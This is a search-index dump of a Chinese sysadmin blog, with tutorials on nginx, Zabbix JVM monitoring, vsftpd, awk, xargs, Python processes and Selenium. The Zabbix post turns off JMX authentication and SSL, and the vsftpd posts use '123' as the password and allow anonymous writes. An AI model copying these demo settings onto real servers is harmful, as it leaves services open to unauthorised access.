对于区分大小写的匹配，正则表达式应从~符号开始，对于不区分大小写的匹配，正则表达式应从~*符号开始。 map还支持以下特殊参数： default value 如果源值不匹配任何指定的变体，则设置结果值。如果未指定default，则默认结果值为空字符串。 hostnames 指示源值是带有前缀或后缀的主机名(xxx.com,xxx.cn,www.xxx.cn) 使用hostnames后，匹配域名时可以使用通配符 *.xxx.com xxx.com xxx.* #上面的配置也可以简写成############# .xxx.com xxx.* 最终在配置文件中呈现 map $http_referer $referer_ok { hostnames; .xxx.com 1; xxx.* 1; default 0; } include file 引入一个变量文件 volatile 指明该变量不可缓存 ","date":"2020-12-28 14:12","objectID":"/post/2157/:0:0","tags":["nginx"],"title":"nginx map指令使用","uri":"/post/2157/"},{"categories":["其他"],"content":"工具下载：http://crawler.archive.org/cmdline-jmxclient/cmdline-jmxclient-0.10.3.jar 官方文档：http://crawler.archive.org/cmdline-jmxclient/ 查看所有bean名称： java -jar cmdline-jmxclient-0.10.3.jar - 127.0.0.1:12347 获取bean属性的名称: java -jar cmdline-jmxclient-0.10.3.jar - 127.0.0.1:12347 'Catalina:name=\"http-nio-8888\",type=ThreadPool' 最终获取bean属性的值: java -jar cmdline-jmxclient-0.10.3.jar - 127.0.0.1:12347 'Catalina:name=\"http-nio-8888\",type=ThreadPool' currentThreadsBusy ","date":"2020-12-24 18:32","objectID":"/post/2151/:0:0","tags":["java"],"title":"cmdline-jmxclient获取jvm的Mbean线程信息","uri":"/post/2151/"},{"categories":["其他"],"content":" \"\"\" 僵尸进程是当子进程比父进程先结束，而父进程又没有回收子进程，释放子进程占用的资源，此时子进程将成为一个僵尸进程。 \"\"\" from multiprocessing import Process import os import time # def task(n): # print('%s is running' % os.getpid()) # # 获取父pid # print('ppid is %s' % os.getppid()) # time.sleep(n) # print('%s is done' % os.getpid()) # # # if __name__ == '__main__': # p = Process(target=task, args=(10,)) # p.start() # print('主', os.getpid()) # time.sleep(10000) # 运行上面的示例，可以实现僵尸进程,进程状态变成了\"Z\" # ps aux | grep [3]8194 # soulchild 38194 0.0 0.0 0 0 ?? Z 9:00AM 0:00.00 (Python) \"\"\" 孤儿进程指的是在其父进程执行完成或被终止后仍继续运行的一类进程。 这些孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集管理工作。 \"\"\" import os mpid = os.getpid() ppid = os.getppid() print(\"我是主进程，主进程id：%s,父进程id:%s\" % (mpid, ppid)) # fork会生成一个子进程,后续代码主进程和子进程都会执行 # pid的值有两个： # 在父进程中pid的值为子进程的pid # 在子进程中pid的值为0 pid = os.fork() if pid == 0: print(\"我是子进程，子进程id:%s,父进程id:%s\" % (os.getpid(), os.getppid())) time.sleep(1) print(\"我是子进程，子进程id:%s,父进程id:%s\" % (os.getpid(), os.getppid())) else: print(\"我是主进程，主进程id:%s,父进程id:%s,我的子进程id:%s\" % (os.getpid(), os.getppid(), pid)) # 上面的代码需要在命令行中执行,在pycharm中执行看不出效果 # 执行结果 # [soulchild@MBP ~]$ python3 03-僵尸进程孤儿进程.py # 我是主进程，主进程id：38979,父进程id:12937 # 我是主进程，主进程id:38979,父进程id:12937,我的子进程id:38980 # 我是子进程，子进程id:38980,父进程id:38979 # [soulchild@MBP ~]$ 我是子进程，子进程id:38980,父进程id:1 ","date":"2020-12-24 14:05","objectID":"/post/2139/:0:0","tags":["linux","python"],"title":"僵尸进程与孤儿进程","uri":"/post/2139/"},{"categories":["监控"],"content":"一、编译安装zabbix-java-gateway 进入zabbix源码包路径 cd /server/packages/zabbix-4.0.16 ./configure --enable-java --prefix=/application/zabbix-java-gateway make \u0026\u0026 make install ","date":"2020-12-24 11:56","objectID":"/post/2138/:1:0","tags":["zabbix","jvm"],"title":"zabbix使用zabbix-java-gateway监控JVM","uri":"/post/2138/"},{"categories":["监控"],"content":"二、启动 su - zabbix -c /application/zabbix-java-gateway/sbin/zabbix_java/startup.sh ","date":"2020-12-24 11:56","objectID":"/post/2138/:2:0","tags":["zabbix","jvm"],"title":"zabbix使用zabbix-java-gateway监控JVM","uri":"/post/2138/"},{"categories":["监控"],"content":"三、zabbix_server的配置文件添加如下两个参数 # 我的zabbix-server和zabbox-java-gateway装在同一台机器上了，所以用的127.0.0.1 JavaGateway=127.0.0.1 JavaGatewayPort=10052 StartJavaPollers=5 重启zabbix-server systemctl restart zabbix-server 如果需要日志调试，可以修改配置文件/application/zabbix-java-gateway/sbin/zabbix_java/lib/logback.xml将info改为debug，日志的输出在/tmp/zabbix_java.log \u003croot level=\"info\"\u003e \u003cappender-ref ref=\"FILE\" /\u003e \u003c/root\u003e ","date":"2020-12-24 11:56","objectID":"/post/2138/:3:0","tags":["zabbix","jvm"],"title":"zabbix使用zabbix-java-gateway监控JVM","uri":"/post/2138/"},{"categories":["监控"],"content":"四、tomcat添加jmx配置 1.vim /application/tomcat/bin/catalina.sh 在第二行添加即可，下面的ip端口号需要修改为zabbix可以连接 CATALINA_OPTS=\"$CATALINA_OPTS -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.port=12345 -Djava.rmi.server.hostname=127.0.0.1\" 2.默认情况下除了12345端口外,还会开放另一个RMI随机端口,这个端口也需要对zabbix-java-gateway开放.但是随机端口不好写规则，所以可以通过修改为固定端口来解决 下载一个扩展jar包 cd /application/tomcat/lib wget http://archive.apache.org/dist/tomcat/tomcat-8/v8.5.54/bin/extras/catalina-jmx-remote.jar 修改tomcat中server.xml,在最后一个\u003cListener className=.../\u003e下面添加即可 \u003cListener className=\"org.apache.catalina.mbeans.JmxRemoteLifecycleListener\" rmiServerPortPlatform=\"12346\" rmiRegistryPortPlatform=\"12345\"/\u003e 3.重启tomcat /application/tomcat/bin/shutdown.sh /application/tomcat/bin/startup.sh ","date":"2020-12-24 11:56","objectID":"/post/2138/:4:0","tags":["zabbix","jvm"],"title":"zabbix使用zabbix-java-gateway监控JVM","uri":"/post/2138/"},{"categories":["监控"],"content":"五、配置zabbix-web(不用自带模板可跳过3和4步) 1.选择要监控的主机 26400-q0kwtfcx3e8.png 2.添加jmx的地址配置 36719-aeepest8k1c.png 3.添加模板 94645-gmllznmrf1c.png 4.检查结果 58728-bozgpc2sn2r.png ","date":"2020-12-24 11:56","objectID":"/post/2138/:5:0","tags":["zabbix","jvm"],"title":"zabbix使用zabbix-java-gateway监控JVM","uri":"/post/2138/"},{"categories":["监控"],"content":"六、推荐模板 https://github.com/rodrigoluissilva/Zabbix-JMX-Tomcat-Extended-Template/tree/master 根据自己的需要选择模板导入即可,下面演示一个 1.导入模板 83878-q1wrlyf6hya.png 2.给主机链接模板 25563-my7ap5gwyor.png 3.修改宏,我的端口是8081。{$HTTP_PORT},{$JMX_PASSWORD},{$JMX_USERNAME} 14524-prrpedd28bi.png 4.给模板添加宏变量,在主机中单独设置也可以。我这里是tomcat8,默认连接器是nio模式 72420-eariq5aq21n.png ","date":"2020-12-24 11:56","objectID":"/post/2138/:6:0","tags":["zabbix","jvm"],"title":"zabbix使用zabbix-java-gateway监控JVM","uri":"/post/2138/"},{"categories":["基础内容"],"content":"一、建立用户数据文件 vim /etc/vsftpd/vsftpd.user user1 123 user2 123 user3 123 user4 123 user5 123 格式: 一行用户一行密码 转换为db文件 db_load -T -t hash -f /etc/vsftpd/vsftpd.user /etc/vsftpd/vsftpd.db chmod 400 /etc/vsftpd/vsftpd.db # 设置只读权限 ","date":"2020-12-23 16:21","objectID":"/post/2131/:1:0","tags":["vsftpd","ftp"],"title":"vsftpd虚拟用户配置(三)","uri":"/post/2131/"},{"categories":["基础内容"],"content":"二、创建ftp映射用户和数据存放目录 mkdir /data/ftp -p useradd -s /sbin/nologin -d /data/ftp/ ftp_user chown -R ftp_user:ftp_user /data/ftp ","date":"2020-12-23 16:21","objectID":"/post/2131/:2:0","tags":["vsftpd","ftp"],"title":"vsftpd虚拟用户配置(三)","uri":"/post/2131/"},{"categories":["基础内容"],"content":"三、建立pam认证文件 vim /etc/pam.d/vsftpd.pam auth required pam_userdb.so db=/etc/vsftpd/vsftpd account required pam_userdb.so db=/etc/vsftpd/vsftpd ","date":"2020-12-23 16:21","objectID":"/post/2131/:3:0","tags":["vsftpd","ftp"],"title":"vsftpd虚拟用户配置(三)","uri":"/post/2131/"},{"categories":["基础内容"],"content":"四、创建用户配置目录 mkdir /etc/vsftpd/users/ ","date":"2020-12-23 16:21","objectID":"/post/2131/:4:0","tags":["vsftpd","ftp"],"title":"vsftpd虚拟用户配置(三)","uri":"/post/2131/"},{"categories":["基础内容"],"content":"五、修改参数 # 允许在家目录下操作 allow_writeable_chroot=YES # vsftpd使用的PAM服务的名称 pam_service_name=vsftpd.pam # 将所有非匿名用户归类为访客登录,将访客重新映射到guest_username参数指定的用户 guest_enable=YES # 映射的用户 guest_username=ftp_user # 用户的配置目录 #如果您将user_config_dir设置为/etc/vsftpd/users/，然后以用户\"chris\"的身份登录，那么vsftpd将在会话期间应用/etc/vsftpd/users/chris文件中的设置。 user_config_dir=/etc/vsftpd/users/ 默认情况下虚拟用户使用的是匿名用户权限,需要注意配置冲突的问题。最好在主配置文件中最小化配置，将虚拟用户的配置单独配置到user_config_dir指定的目录中 可以通过virtual_use_local_privs参数修改虚拟用户使用本地用户权限 ","date":"2020-12-23 16:21","objectID":"/post/2131/:5:0","tags":["vsftpd","ftp"],"title":"vsftpd虚拟用户配置(三)","uri":"/post/2131/"},{"categories":["基础内容"],"content":"六、创建虚拟用户 vim /etc/vsftpd/users/user1 注意用户名和vsftpd.user的一致 # 允许上传 anon_upload_enable=YES # 默认权限，755和644 anon_umask=022 客户端测试 # 上传下载和文件权限没问题 [soulchild@MBP test111]$ lftp 10.0.0.13 -u user1,123 lftp user1@10.0.0.13:~\u003e !ls aaa fun1 fun2 fun3 num4.sh lftp user1@10.0.0.13:~\u003e put fun1 20 bytes transferred lftp user1@10.0.0.13:/\u003e ls -rw-r--r-- 1 1003 1003 20 Dec 23 10:11 fun1 lftp user1@10.0.0.13:/\u003e get fun1 -o fun1-remote 20 bytes transferred lftp user1@10.0.0.13:/\u003e !ls aaa fun1 fun1-remote fun2 fun3 num4.sh # 创建文件夹会失败 lftp user1@10.0.0.13:/\u003e mkdir my_user1 mkdir: Access failed: 550 Permission denied. (my_user1) 创建另一个用户 vim /etc/vsftpd/users/user1 # 允许创建文件夹 anon_mkdir_write_enable=YES 客户端测试 # 可以创建文件夹 lftp user2@10.0.0.13:/\u003e ls -rw-r--r-- 1 1003 1003 20 Dec 23 10:11 fun1 lftp user2@10.0.0.13:/\u003e mkdir test mkdir ok, `test' created lftp user2@10.0.0.13:/\u003e ls -rw-r--r-- 1 1003 1003 20 Dec 23 10:11 fun1 drwx------ 2 1003 1003 6 Dec 23 10:17 test # 不允许上传 lftp user2@10.0.0.13:/\u003e put fun3 put: Access failed: 550 Permission denied. (fun3) 其他参数： # 允许匿名用户上传文件 anon_upload_enable=YES # 允许匿名用户创建目录,必须对父目录有写权限才能创建 anon_mkdir_write_enable=YES # 允许匿名用户执行除上传和创建目录之外的写操作，例如删除和重命名。 anon_other_write_enable=YES # 匿名用户的最大传输速度限制,单位byte。1048576Byte=1MB # anon_max_rate=1048576 # 文件(夹)创建的默认权限。 文件夹777-022=755，默认权限就是drwxr-xr-x 文件666-022=644，默认权限就是-rw-r--r-- anon_umask=022 # 匿名用户的根目录 anon_root=/var/ftp/ # 用户变量，当前登录用户赋值给$USER(主配置文件配置) user_sub_token=$USER # 如果想每个用户到自己的目录,可以做如下配置 local_root=/data/ftp/$USER 更多参数：http://vsftpd.beasts.org/vsftpd_conf.html ","date":"2020-12-23 16:21","objectID":"/post/2131/:6:0","tags":["vsftpd","ftp"],"title":"vsftpd虚拟用户配置(三)","uri":"/post/2131/"},{"categories":["基础内容"],"content":"本地用户 用户名密码：使用的是操作系统的系统账号密码 默认目录：用户家目录 ","date":"2020-12-23 14:17","objectID":"/post/2130/:1:0","tags":["vsftpd","ftp"],"title":"vsftpd本地用户(系统用户)模式(二)","uri":"/post/2130/"},{"categories":["基础内容"],"content":"创建用户 useradd -s /sbin/nologin -d /data/ftp/test_u1 test_u1 echo \"123\" | passwd --stdin test_u1 相关参数 # 启用本地用户 local_enable=YES # 创建文件(夹)的默认权限 local_umask=022 # 本地用户的根目录 local_root=/var/ftp ####################################################################### # 将所有用户禁锢在主目录,防止切换到系统根目录 chroot_local_user=YES # 启用后可以指定一个文件(chroot_list_file参数)，文件中的用户会被禁锢在主目录。 # 当chroot_local_user=YES时,文件中的用户不会被禁锢在主目录 chroot_list_enable=YES # 用户列表文件(配合chroot_list_enable=YES使用) chroot_list_file=/etc/vsftpd/chroot_list # 被限制的用户，在家目录操作时被报500,添加如下参数即可 allow_writeable_chroot=YES ####################################################################### # 限制速度,单位byte。1048576byte=1M local_max_rate=1048576 # 欢迎语 ftpd_banner=\"hello\" ####################################################################### # 启用会使userlist_file生效，实现的效果取决于userlist_deny的配置。 userlist_enable=YES # 默认值是YES,拒绝userlist_file中的用户登录。NO代表只允许userlist_file中的用户登录 userlist_deny=YES # 用户列表文件(配合userlist_enable=YES使用) userlist_file=/etc/vsftpd.user_list # /etc/vsftpd/ftpusers这个文件里的用户是拒绝登录的，优先级最高 ####################################################################### ","date":"2020-12-23 14:17","objectID":"/post/2130/:2:0","tags":["vsftpd","ftp"],"title":"vsftpd本地用户(系统用户)模式(二)","uri":"/post/2130/"},{"categories":["系统服务"],"content":"一、安装启动 vsftp: server端 ftp: 客户端 yum install -y vsftpd ftp systemctl enable vsftpd systemctl start vsftpd 默认目录: /var/ftp/ ","date":"2020-12-23 11:54","objectID":"/post/2129/:1:0","tags":["vsftpd","ftp"],"title":"vsftpd安装和匿名模式(一)","uri":"/post/2129/"},{"categories":["系统服务"],"content":"二、匿名模式 匿名用户: ftp或anonymous 密码为空 工作目录: /var/ftp/ 默认权限: 可下载不可上传 ","date":"2020-12-23 11:54","objectID":"/post/2129/:2:0","tags":["vsftpd","ftp"],"title":"vsftpd安装和匿名模式(一)","uri":"/post/2129/"},{"categories":["系统服务"],"content":"三、相关参数参数 # 启用匿名用户 anonymous_enable=YES # 允许匿名用户上传文件 anon_upload_enable=YES # 允许匿名用户创建目录,必须对父目录有写权限才能创建 anon_mkdir_write_enable=YES # 允许匿名用户执行除上传和创建目录之外的写操作，例如删除和重命名。 anon_other_write_enable=YES # 匿名用户登录不询问密码 no_anon_password=YES # 匿名用户的最大传输速度限制,单位byte。1048576Byte=1MB # anon_max_rate=1048576 # 文件(夹)创建的默认权限。 文件夹777-022=755，默认权限就是drwxr-xr-x 文件666-022=644，默认权限就是-rw-r--r-- anon_umask=022 # 匿名用户的根目录 anon_root=/var/ftp/ 更多参数：http://vsftpd.beasts.org/vsftpd_conf.html ","date":"2020-12-23 11:54","objectID":"/post/2129/:3:0","tags":["vsftpd","ftp"],"title":"vsftpd安装和匿名模式(一)","uri":"/post/2129/"},{"categories":["python"],"content":" \"\"\" 原理剖析:http://c.biancheng.net/view/5537.html GIL的功能是：在CPython解释器中执行的每一个Python线程，都会先锁住自己(线程)，以阻止别的线程执行。 在cpython解释器中,同一个进程下开启的多线程，同一个时间只能有一个线程执行，无法利用多核优势。 也就是说由于全局解释器锁(GIL)的原因，cpython没有真正意义上的多线程 \"\"\" # IO密集型适合多线程 # 计算密集型适合多进程 from multiprocessing import Process from threading import Thread import os import time ######################################################################## # 计算密集型 # def work(): # res = 1 # for i in range(100000000): # res *= i # return res # # # if __name__ == '__main__': # print(\"cpus\", os.cpu_count()) # start_time = time.time() # l = [] # # 将计算任务，用多进程和多线程运行4次的时间比较 # for i in range(4): # # 4个进程基本同时运行(cpu支持数量)，单进程运行需要4s，所以总时间在4s多一点，因为同一时间有4个进程同时运行 # # w = Process(target=work) # 运行时间4.5s # # # 4个线程并发执行，每个线程之间由于有GIL锁的原因,线程会来回切换，实际上同一时间只有一个线程在执行。 # # 由于cpu计算的时候并没有同时计算，所以单线程4s,4线程需要16s多一点 # w = Thread(target=work) # 运行时间16.3s # l.append(w) # w.start() # # for i in l: # i.join() # # print('运行结束%s' % (time.time() - start_time)) ######################################################################## # IO密集型 def work(): time.sleep(2) if __name__ == '__main__': print(\"cpus\", os.cpu_count()) start_time = time.time() l = [] # 将IO任务，用多进程和多线程运行400次的时间比较 for i in range(400): # 开启的数量越多，进程和线程的差距越明显 # 开启400个进程,子进程需要复制主进程的资源,复制是有损耗的,所以单次运行时间是2秒,加上损耗将近1秒 w = Process(target=work) # 运行时间2.99s # 开启400个线程,线程的资源是共享主线程的,因为没有涉及到计算，运行时间取决于IO时间 # 所以单次运行时间是2s,总时间在2s多一点 # w = Thread(target=work) # 运行时间2.02s l.append(w) w.start() for i in l: i.join() print('运行结束%s' % (time.time() - start_time)) ","date":"2020-12-22 10:58","objectID":"/post/2123/:0:0","tags":["python"],"title":"python-GIL锁介绍进程线程效率比较","uri":"/post/2123/"},{"categories":["基础内容","常用命令"],"content":"原文链接：http://www.ruanyifeng.com/blog/2018/11/awk.html ","date":"2020-12-17 17:30","objectID":"/post/2117/:0:0","tags":[],"title":"awk命令使用","uri":"/post/2117/"},{"categories":["基础内容","常用命令"],"content":"基本用法 awk是一行一行处理数据的 # 格式 $ awk 动作 文件名 # 示例 $ echo 'this is a test' | awk '{print $1}' this ","date":"2020-12-17 17:30","objectID":"/post/2117/:1:0","tags":[],"title":"awk命令使用","uri":"/post/2117/"},{"categories":["基础内容","常用命令"],"content":"常见变量 0: 完整的内容 $n: 分割后的内容$1就是第一部分.$2就是第二部分 FILENAME：当前文件名 FS：字段分隔符，默认是空格和制表符。也可以-F参数来修改 RS：行分隔符，用于分割每一行，默认是换行符。 OFS：输出字段的分隔符，用于打印时分隔字段，默认为空格。 ORS：输出记录的分隔符，用于打印时分隔记录，默认为换行符。 OFMT：数字输出的格式，默认为％.6g。(%f 后面如果不满6位小数就补0,%g 不补0不显示) NF: NF代表当前有多少列(小技巧:$NF代表最后一列的内容） 打印第一列和倒数第二列,,代表使用空格分割显示 awk -F ':' '{print $1, $(NF-1)}' /etc/passwd root /root bin /bin daemon /sbin adm /var/adm NR: 当前处理的是第几行 ","date":"2020-12-17 17:30","objectID":"/post/2117/:2:0","tags":[],"title":"awk命令使用","uri":"/post/2117/"},{"categories":["基础内容","常用命令"],"content":"函数 toupper()：字符转换为大写 tolower()：字符转为小写 length()：返回字符串长度 substr()：返回子字符串 sin()：正弦 cos()：余弦 sqrt()：平方根 rand()：随机数 awk内置函数的完整列表，可以查看手册 awk -F ':' '{ print toupper($1) }' /etc/passwd ROOT BIN DAEMON ADM ","date":"2020-12-17 17:30","objectID":"/post/2117/:3:0","tags":[],"title":"awk命令使用","uri":"/post/2117/"},{"categories":["基础内容","常用命令"],"content":"条件 awk允许指定输出条件，只输出符合条件的行。 输出条件要写在动作的前面。 awk '条件 动作' 文件名 请看下面的例子。 $ awk -F ':' '/usr/ {print $1}' /etc/passwd root daemon bin sys 上面代码中，print命令前面是一个正则表达式，只输出包含usr的行。 下面的例子只输出奇数行，以及输出第三行以后的行。 # 输出奇数行 $ awk -F ':' 'NR % 2 == 1 {print $1}' /etc/passwd root bin sync # 输出第三行以后的行 $ awk -F ':' 'NR \u003e3 {print $1}' /etc/passwd sys sync 下面的例子输出第一个字段等于指定值的行。 awk -F ':' '$1 == \"root\" {print $1}' /etc/passwd root # 或者 awk -F ':' '$1 == \"root\" || $1 == \"bin\" {print $1}' /etc/passwd root bin ","date":"2020-12-17 17:30","objectID":"/post/2117/:4:0","tags":[],"title":"awk命令使用","uri":"/post/2117/"},{"categories":["基础内容","常用命令"],"content":"if 语句 awk提供了if结构，用于编写复杂的条件。 $ awk -F ':' '{if ($1 \u003e \"m\") print $1}' /etc/passwd root sys sync 上面代码输出第一个字段的第一个字符大于m的行。 if结构还可以指定else部分。 awk -F ':' '{if ($1 \u003e \"m\") print $1; else print \"---\"}' demo.txt root --- --- sys sync ","date":"2020-12-17 17:30","objectID":"/post/2117/:5:0","tags":[],"title":"awk命令使用","uri":"/post/2117/"},{"categories":["基础内容","常用命令"],"content":"预处理BEGIN和后处理END # 格式 awk 'BEGIN{处理前} {处理中} END{处理后}' /etc/passwd # 示例 awk -F: 'BEGIN{print \"处理前\"} {print $1,\"处理中\"} END{处理后}' /etc/passwd ","date":"2020-12-17 17:30","objectID":"/post/2117/:6:0","tags":[],"title":"awk命令使用","uri":"/post/2117/"},{"categories":["基础内容","常用命令"],"content":"循环 awk '{total = 0 for (var = 1; var \u003c 5; var++){total += $var} avg = total / 3 print \"Average:\",avg }' testfile ","date":"2020-12-17 17:30","objectID":"/post/2117/:7:0","tags":[],"title":"awk命令使用","uri":"/post/2117/"},{"categories":["常用命令"],"content":"参考链接：http://www.ruanyifeng.com/blog/2019/08/xargs-tutorial.html ","date":"2020-12-17 10:44","objectID":"/post/2110/:0:0","tags":[],"title":"xargs命令使用","uri":"/post/2110/"},{"categories":["常用命令"],"content":"xargs 命令的作用 ** 管道的作用是将标准输出转换成标准输入 ** ** xargs可以将标准输入转为命令行参数 ** echo \"hello world\" | echo 没有输出。因为管道右侧的echo不接受标准输入 echo \"hello world\" | xargs echo 输出hello world ","date":"2020-12-17 10:44","objectID":"/post/2110/:1:0","tags":[],"title":"xargs命令使用","uri":"/post/2110/"},{"categories":["常用命令"],"content":"1. -d参数-分隔符 默认情况下，xargs将换行符和空格作为分隔符，把标准输入分解成一个个命令行参数。 echo \"one two three\" | xargs mkdir 上面命令中，mkdir会新建三个子目录，因为xargs将one two three分解成三个命令行参数，执行mkdir one two three。 echo -e \"a\\tb\\tc\" | xargs -d \"\\t\" echo -d参数可以更改分隔符 ","date":"2020-12-17 10:44","objectID":"/post/2110/:1:1","tags":[],"title":"xargs命令使用","uri":"/post/2110/"},{"categories":["常用命令"],"content":"2. -p，-t 参数-提示和询问 -p是打印最终执行的命令,并且询问是否执行 echo 'one two three' | xargs -p touch touch one two three ?... -t是打印出最终执行的命令,直接执行 echo 'one two three' | xargs -t rm rm one two three ","date":"2020-12-17 10:44","objectID":"/post/2110/:1:2","tags":[],"title":"xargs命令使用","uri":"/post/2110/"},{"categories":["常用命令"],"content":"3. -0 参数与find命令-null作为分隔符 由于xargs默认将空格作为分隔符，所以不太适合处理文件名，因为文件名可能包含空格。 find命令有一个特别的参数-print0，指定输出的文件列表以null分隔。然后，xargs命令的-0参数表示用null当作分隔符。 find /tmp -type f -mtime 0 -print0 | xargs -p0 rm rm /tmp/one /tmp/two /tmp/three ?... 上面命令删除/tmp路径下当天修改的文件。由于分隔符是null，所以处理包含空格的文件名，也不会报错。 还有一个原因，使得xargs特别适合find命令。有些命令（比如rm）一旦参数过多会报错\"参数列表过长\"，而无法执行，改用xargs就没有这个问题，因为它对每个参数执行一次命令。 find . -name \"*.txt\" | xargs grep \"abc\" 上面命令找出所有 TXT 文件以后，对每个文件搜索一次是否包含字符串abc。 ","date":"2020-12-17 10:44","objectID":"/post/2110/:1:3","tags":[],"title":"xargs命令使用","uri":"/post/2110/"},{"categories":["常用命令"],"content":"4. -L参数-按行作为参数 标准输入包含多行,但是find不能接收这样的参数。会报错 echo -en 'a\\nb\\nc' | xargs -p find ./ -name find ./ -name a b c ?... 可以使用-L参数指定多少行作为一个命令行参数。(分别运行了1次find命令) echo -en 'a\\nb\\nc' | xargs -pL 1 find ./ -name find ./ -name a ?... find ./ -name b ?... find ./ -name c ?... ","date":"2020-12-17 10:44","objectID":"/post/2110/:1:4","tags":[],"title":"xargs命令使用","uri":"/post/2110/"},{"categories":["常用命令"],"content":"5. -n参数-分割n个参数作为一个参数 echo -en 'hello world b c' | xargs -p find ./ -name ","date":"2020-12-17 10:44","objectID":"/post/2110/:1:5","tags":[],"title":"xargs命令使用","uri":"/post/2110/"},{"categories":["常用命令"],"content":"6. -i/I参数-将标准输入存入变量 -i将标准输入赋值给{}, -I xxx可以自定义赋值给谁 echo -e '1,2,3\\n4\\n5\\n6' | xargs -I txt ls txt ls: cannot access '1,2,3': No such file or directory ls: cannot access '4': No such file or directory ls: cannot access '5': No such file or directory ls: cannot access '6': No such file or directory 或者 echo -e '1,2,3\\n4\\n5\\n6' | xargs -i ls {} 利用-I执行多条命令 $ cat foo.txt one two three $ cat foo.txt | xargs -I file sh -c 'echo file; mkdir file' one two three $ ls one two three 上面代码中，foo.txt是一个三行的文本文件。我们希望对每一项命令行参数，执行两个命令（echo和mkdir） ","date":"2020-12-17 10:44","objectID":"/post/2110/:1:6","tags":[],"title":"xargs命令使用","uri":"/post/2110/"},{"categories":["基础内容","系统服务"],"content":"新分区：/sdb1 挂载目录：/nfsdata/aaa mount /dev/sdb1 /nfsdata/aaa 创建目录和文件 mkdir /nfsdata/aaa/{bbb,ccc} touch /nfsdata/aaa/{bbb,ccc}/123 nfs配置文件/etc/exports /nfsdata 10.1.0.0/24(rw,sync,no_root_squash,no_all_squash) /nfsdata/aaa 10.1.0.0/24(rw,sync,no_root_squash,no_all_squash) 通过nfs挂载 mount -t nfs 10.1.0.10:/nfsdata/aaa /nfstest # 挂载成功但是/nfstest目录没有内容(挂载到原分区了) mount -t nfs 10.1.0.10:/nfsdata/aaa/bbb /nfstest # 挂载成功nfstest目录有内容(挂载到新分区了) 当父级目录已共享时，只有挂载共享目录的子目录的时候才能成功 ","date":"2020-12-16 11:11","objectID":"/post/2107/:0:0","tags":["nfs"],"title":"nfs挂载问题","uri":"/post/2107/"},{"categories":["基础内容"],"content":"find -mtime +N/-N/N -mtime n : 在n天之前的当天被修改文件 比如今天是1月10日, -mtime 3,就代表1月7号当天被修改的文件 -mtime +n : 在n天之前（不含n天本身）被修改的文件 比如今天是1月10日, -mtime +3,就代表1月7号之前被修改的文件(不包括1月7号) -mtime -n : 在n天之内（含n天本身）被修改的文件 比如今天是1月10日, -mtime -3,就代表1月7号之内被修改的文件(包括1月7号) ","date":"2020-12-11 18:10","objectID":"/post/2098/:0:0","tags":["linux"],"title":"find -mtime的含义","uri":"/post/2098/"},{"categories":["基础内容"],"content":"n的含义是：n*24小时，系统计算也是按照小时来计算的，所以有时候会发现是当天的文件，但是没有找到，因为他是按照当前的时间往前推n*24小时的","date":"2020-12-11 18:10","objectID":"/post/2098/:1:0","tags":["linux"],"title":"find -mtime的含义","uri":"/post/2098/"},{"categories":["其他"],"content":"代码： cat \u003e NowString.java \u003c\u003cEOF import java.util.Date; import java.text.SimpleDateFormat; public class NowString { public static void main(String[] args) { SimpleDateFormat df = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\"); System.out.println(df.format(new Date())); } } EOF 编译： javac NowString.java 运行: java NowString ","date":"2020-11-30 10:19","objectID":"/post/2087/:0:0","tags":["java"],"title":"java获取系统当前时间","uri":"/post/2087/"},{"categories":["docker"],"content":"报错 Caused by: java.lang.NullPointerException: null at sun.awt.FontConfiguration.getVersion(FontConfiguration.java:1264) at sun.awt.FontConfiguration.readFontConfigFile(FontConfiguration.java:219) at sun.awt.FontConfiguration.init(FontConfiguration.java:107) at sun.awt.X11FontManager.createFontConfiguration(X11FontManager.java:774) at sun.font.SunFontManager$2.run(SunFontManager.java:431) at java.security.AccessController.doPrivileged(Native Method) at sun.font.SunFontManager.\u003cinit\u003e(SunFontManager.java:376) 安装ttf-dejavu dockerfile FROM openjdk:8u212-jdk-alpine RUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories RUN apk update \u0026\u0026 apk add ttf-dejavu tzdata \u0026\u0026 cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\ \u0026\u0026 echo \"Asia/Shanghai\" \u003e /etc/timezone \\ \u0026\u0026 apk del tzdata \u0026\u0026 rm -rf /var/cache/apk/* ","date":"2020-11-27 13:16","objectID":"/post/2086/:0:0","tags":["docker"],"title":"alpine缺少FontConfiguration报空指针","uri":"/post/2086/"},{"categories":["python"],"content":"一、下载配置driver https://npm.taobao.org/mirrors/chromedriver/83.0.4103.39/ 解压后移动到下面目录 mv chromedriver /usr/local/bin/ ","date":"2020-11-26 16:21","objectID":"/post/2085/:1:0","tags":["python","爬虫"],"title":"selenium入门","uri":"/post/2085/"},{"categories":["python"],"content":"二、安装selenium pip install selenium ","date":"2020-11-26 16:21","objectID":"/post/2085/:2:0","tags":["python","爬虫"],"title":"selenium入门","uri":"/post/2085/"},{"categories":["python"],"content":"三、简单使用 #!/usr/bin/python # -*- coding: UTF-8 -*- \"\"\" @author:soulchild @file:selenium_learn.py @time:2020/11/26 \"\"\" from selenium import webdriver import time # 实例化driver对象 driver = webdriver.Chrome() # 如果没有配置环境变量,可以用executable_path指定浏览器驱动文件路径 # 打开浏览器发送请求 driver.get(\"http://soulchild.cn\") # 获取输入框元素 search_element = driver.find_element_by_id('search').find_element_by_tag_name('input') # 向元素发送内容 search_element.send_keys('docker') # 点击搜索 # driver.find_element_by_id('search').find_element_by_id('stss').click() driver.execute_script(\"document.getElementById('stss').click()\") # 其他操作 # driver.page_source 当前标签页浏览器渲染之后的网页源代码 # driver.current_url 当前标签页的url # driver.title 当前标签页标题 # driver.close() 关闭当前标签页，如果只有一个标签页则关闭整个浏览器 # driver.quit() 关闭浏览器 # driver.forward() 页面前进 # driver.back() 页面后退 # driver.save_screenshot('img_name') 页面截图 ","date":"2020-11-26 16:21","objectID":"/post/2085/:3:0","tags":["python","爬虫"],"title":"selenium入门","uri":"/post/2085/"},{"categories":["系统服务"],"content":"** 在要收集的请求头前面加$http前缀即可 ** 例如user_agent和referer 在日志就填写内容如下: $http_user_agent $http_referer log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\" '; 注: 